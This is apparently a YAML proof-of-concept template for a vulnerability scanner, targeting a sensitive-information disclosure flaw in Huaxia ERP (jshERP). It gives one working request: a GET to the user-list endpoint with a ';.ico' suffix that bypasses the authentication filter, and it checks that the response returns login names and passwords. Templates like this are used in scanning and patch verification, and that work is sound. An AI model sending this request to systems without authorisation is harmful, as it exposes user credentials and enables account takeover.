id: poc-yaml-huaxia-erp-sensitive-information-disclosure
info:
  name: 华夏ERP-敏感信息泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: 华夏ERP
requests:
- method: GET
  path: /jshERP-boot/user/getAllList;.ico
  expression: status_code == 200 && contains(body, "loginName") && contains(body,
    "password") && contains(body, "{\"code\":200,\"data\":{\"userList\"")
variables: {}
transport: http
